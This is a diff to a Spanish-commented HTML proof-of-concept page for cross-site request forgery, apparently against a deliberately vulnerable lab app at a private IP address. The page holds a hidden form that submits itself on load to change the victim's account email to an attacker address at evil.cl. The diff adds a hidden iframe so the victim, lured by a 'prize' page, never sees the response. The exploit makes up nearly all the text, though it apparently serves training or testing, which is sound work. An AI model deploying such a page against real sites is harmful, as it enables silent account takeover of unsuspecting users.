@@ -20,8 +20,12 @@
     VARIANTE POST (realista): formulario oculto que se auto-envia al cargar.
     Hace POST al endpoint vulnerable; la cookie de sesion de la victima viaja
     sola (SameSite=None en modo vuln) y no hay token anti-CSRF que lo detenga.
+    El resultado se carga en un iframe oculto para no navegar fuera del premio
+    ni reemplazar la pagina de la victima con la respuesta del servidor.
   -->
-  <form id="f" method="post" action="https://192.168.56.10:8001/account/change-email">
+  <iframe name="premio_resultado" title="Resultado de la solicitud" hidden></iframe>
+  <form id="f" method="post" action="https://192.168.56.10:8001/account/change-email"
+        target="premio_resultado" hidden>
     <input type="hidden" name="new" value="atacante@evil.cl">
   </form>
   <script>document.getElementById('f').submit();</script>
